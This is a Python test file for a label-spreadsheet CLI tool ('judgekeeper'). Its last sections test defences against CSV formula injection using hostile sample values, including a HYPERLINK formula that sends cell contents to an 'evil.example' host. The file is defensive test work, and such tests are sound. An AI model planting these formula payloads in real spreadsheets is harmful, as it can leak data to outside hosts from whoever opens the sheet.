"""Labels from a spreadsheet: `template` writes a sheet, `import-labels` reads it back."""

import csv
import json

from judgekeeper.anchors import load_verified
from judgekeeper.cli import main
from judgekeeper.table import derive_id


def _items(tmp_path, n=5, with_ids=True):
    path = tmp_path / "items.jsonl"
    rows = []
    for i in range(n):
        row = {"input": f"question {i}", "output": f"answer {i}"}
        if with_ids:
            row = {"id": f"it{i}", **row}
        rows.append(row)
    path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
    return path


def _read(path):
    with path.open(newline="", encoding="utf-8") as f:
        return list(csv.DictReader(f))


def _write(path, rows):
    with path.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)


def test_template_writes_an_empty_label_column(tmp_path):
    labels = tmp_path / "labels.csv"
    assert main(["template", str(_items(tmp_path)), "-o", str(labels)]) == 0
    rows = _read(labels)
    assert list(rows[0]) == ["id", "input", "output", "human_label", "notes"]
    assert [r["id"] for r in rows] == [f"it{i}" for i in range(5)]
    assert all(r["human_label"] == "" and r["notes"] == "" for r in rows)


def test_template_from_csv_derives_ids(tmp_path):
    src = tmp_path / "items.csv"
    _write(src, [{"input": "q1", "output": "a1"}, {"input": "q2", "output": "a2"}])
    labels = tmp_path / "labels.csv"
    assert main(["template", str(src), "-o", str(labels)]) == 0
    rows = _read(labels)
    assert rows[0]["id"] == derive_id({"input": "q1", "output": "a1"})


def test_template_rejects_duplicate_ids(tmp_path, capsys):
    src = tmp_path / "items.csv"
    _write(src, [{"input": "q", "output": "a"}, {"input": "q", "output": "a"}])
    assert main(["template", str(src), "-o", str(tmp_path / "l.csv")]) == 2
    assert "duplicate" in capsys.readouterr().err


def test_round_trip_with_unlabeled_rows_and_quality_warnings(tmp_path, capsys):
    labels = tmp_path / "labels.csv"
    main(["template", str(_items(tmp_path)), "-o", str(labels)])
    rows = _read(labels)
    for row, label in zip(rows, ["yes", "Pass", "no", "good", ""]):
        row["human_label"] = label
    rows[0]["notes"] = "checked twice"
    _write(labels, rows)
    anchors = tmp_path / "anchors.jsonl"
    capsys.readouterr()
    assert main(["import-labels", str(labels), "-o", str(anchors),
                 "--label-map", "good=pass"]) == 0
    printed = capsys.readouterr().out
    assert "1 unlabeled" in printed and "it4" in printed
    assert "error bars are wide; aim for about 100" in printed
    items, manifest = load_verified(anchors)  # frozen
    assert [i["id"] for i in items] == ["it0", "it1", "it2", "it3"]
    assert [i["human_label"] for i in items] == ["pass", "pass", "fail", "pass"]
    assert items[0]["notes"] == "checked twice" and "notes" not in items[1]
    assert manifest["label_distribution"] == {"fail": 1, "pass": 3}


def test_import_labels_unmapped_is_usage_error(tmp_path, capsys):
    labels = tmp_path / "labels.csv"
    _write(labels, [{"id": "a", "input": "q", "output": "o", "human_label": "meh", "notes": ""}])
    assert main(["import-labels", str(labels), "-o", str(tmp_path / "a.jsonl")]) == 2
    assert "'meh'" in capsys.readouterr().err


def test_import_labels_lopsided_warning(tmp_path, capsys):
    labels = tmp_path / "labels.csv"
    rows = [{"id": f"x{i}", "input": "q", "output": f"o{i}", "human_label": "pass", "notes": ""}
            for i in range(9)]
    rows.append({"id": "y", "input": "q", "output": "o", "human_label": "fail", "notes": ""})
    _write(labels, rows)
    assert main(["import-labels", str(labels), "-o", str(tmp_path / "a.jsonl")]) == 0
    assert "more lopsided than 80/20" in capsys.readouterr().out


def test_import_labels_with_nothing_labeled_is_usage_error(tmp_path):
    labels = tmp_path / "labels.csv"
    main(["template", str(_items(tmp_path)), "-o", str(labels)])
    assert main(["import-labels", str(labels), "-o", str(tmp_path / "a.jsonl")]) == 2


def test_label_quality_warnings_appear_in_every_report(tmp_path):
    from judgekeeper import check_table

    rows = [{"id": f"p{i}", "verdict": "pass", "label": "pass"} for i in range(70)]
    rows += [{"id": f"f{i}", "verdict": "fail", "label": "fail"} for i in range(10)]
    r = check_table(rows, out=tmp_path)
    codes = {f["code"] for f in r["verdict"]["flags"]}
    assert "lopsided_labels" in codes and "few_labels" not in codes
    assert r["label_quality"]["largest_class_share"] == 70 / 80


# --- spreadsheet formula injection (security audit item 5) -------------------------------------


FORMULA_TEXTS = ("=HYPERLINK(\"http://evil\",\"x\")", "+1+1", "-2", "@SUM(A1)")


def test_template_neutralises_formula_prefixes(tmp_path):
    src = tmp_path / "items.jsonl"
    src.write_text("".join(json.dumps({"id": f"it{i}", "input": t, "output": t}) + "\n"
                           for i, t in enumerate(FORMULA_TEXTS)), encoding="utf-8")
    labels = tmp_path / "labels.csv"
    assert main(["template", str(src), "-o", str(labels)]) == 0
    rows = _read(labels)
    assert [r["input"] for r in rows] == ["'" + t for t in FORMULA_TEXTS]
    assert [r["output"] for r in rows] == ["'" + t for t in FORMULA_TEXTS]


def test_template_leaves_ordinary_text_alone(tmp_path):
    src = tmp_path / "items.jsonl"
    src.write_text(json.dumps({"id": "it0", "input": "what is 2+2?", "output": "it's 4"}) + "\n",
                   encoding="utf-8")
    labels = tmp_path / "labels.csv"
    assert main(["template", str(src), "-o", str(labels)]) == 0
    assert _read(labels)[0] | {} == {"id": "it0", "input": "what is 2+2?", "output": "it's 4",
                                   "human_label": "", "notes": ""}


def test_import_labels_restores_guarded_text(tmp_path):
    src = tmp_path / "items.jsonl"
    src.write_text("".join(json.dumps({"id": f"it{i}", "input": t, "output": t}) + "\n"
                           for i, t in enumerate(FORMULA_TEXTS)), encoding="utf-8")
    labels = tmp_path / "labels.csv"
    main(["template", str(src), "-o", str(labels)])
    rows = _read(labels)
    for row in rows:
        row["human_label"] = "pass"
    rows[0]["notes"] = "=looks fine"
    _write(labels, rows)
    anchors = tmp_path / "anchors.jsonl"
    assert main(["import-labels", str(labels), "-o", str(anchors)]) == 0
    items, _ = load_verified(anchors)
    assert [i["input"] for i in items] == list(FORMULA_TEXTS)
    assert [i["output"] for i in items] == list(FORMULA_TEXTS)
    assert items[0]["notes"] == "=looks fine"


# --- formula injection through the id column (security review, finding 1) ----------------------

# Every prefix a spreadsheet runs as a formula. Ids are trimmed of surrounding whitespace when
# read (as everywhere in judgekeeper), so the tab and carriage-return ids arrive without them.
HOSTILE_IDS = ('=HYPERLINK("http://evil.example/?x="&A1,"click")', "+1+1", "-2", "@SUM(1)",
               "\ttab", "\rcr")
FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")


def _cells(path):
    with path.open(newline="", encoding="utf-8") as f:
        return [cell for row in list(csv.reader(f))[1:] for cell in row]


def test_template_guards_formula_ids_and_import_labels_restores_them(tmp_path):
    src = tmp_path / "items.jsonl"
    src.write_text("".join(json.dumps({"id": i, "input": f"q{n}", "output": f"a{n}"}) + "\n"
                           for n, i in enumerate(HOSTILE_IDS)), encoding="utf-8")
    labels = tmp_path / "labels.csv"
    assert main(["template", str(src), "-o", str(labels)]) == 0
    assert not [c for c in _cells(labels) if c.startswith(FORMULA_STARTS)]
    rows = _read(labels)
    for row in rows:
        row["human_label"] = "pass"
    _write(labels, rows)
    anchors = tmp_path / "anchors.jsonl"
    assert main(["import-labels", str(labels), "-o", str(anchors)]) == 0
    items, _ = load_verified(anchors)
    assert [i["id"] for i in items] == [i.strip() for i in HOSTILE_IDS]
    assert [i["id"] for i in items][:4] == list(HOSTILE_IDS[:4])


def test_template_from_csv_with_formula_ids_writes_no_formula(tmp_path):
    """The reviewer's input: an items.csv whose ids are formulas."""
    src = tmp_path / "items.csv"
    _write(src, [{"id": HOSTILE_IDS[0], "input": "q0", "output": "a0"},
                 {"id": "@SUM(1)", "input": "q1", "output": "a1"}])
    out = tmp_path / "tmpl.csv"
    assert main(["template", str(src), "-o", str(out)]) == 0
    assert [r["id"] for r in _read(out)] == ["'" + HOSTILE_IDS[0], "'@SUM(1)"]
    # A sheet that is read again as items (template of a template) keeps the ids.
    again = tmp_path / "again.csv"
    assert main(["template", str(out), "-o", str(again)]) == 0
    assert again.read_text(encoding="utf-8") == out.read_text(encoding="utf-8")


def test_guarded_ids_in_a_sheet_match_their_items_as_import_labels(tmp_path):
    """`import --labels` reads the same sheet: the quote on an id must not hide its label."""
    ids = ("=x", "@y")
    src = tmp_path / "items.jsonl"
    src.write_text("".join(json.dumps({"id": i, "input": "q", "output": f"a{n}"}) + "\n"
                           for n, i in enumerate(ids)), encoding="utf-8")
    sheet = tmp_path / "labels.csv"
    assert main(["template", str(src), "-o", str(sheet)]) == 0
    rows = _read(sheet)
    rows[0]["human_label"], rows[1]["human_label"] = "pass", "fail"
    _write(sheet, rows)
    records = tmp_path / "records.csv"
    _write(records, [{"id": i, "metric": "q", "value": v, "kind": "llm"}
                     for i, v in zip(ids, ("pass", "fail"))])
    out = tmp_path / "out"
    assert main(["import", "records", str(records), "--map",
                 "target_id=id,name=metric,label=value,annotator_kind=kind",
                 "--labels", str(sheet), "--out", str(out)]) == 0
    items, _ = load_verified(out / "anchors.jsonl")
    assert {i["id"]: i["human_label"] for i in items} == {"=x": "pass", "@y": "fail"}
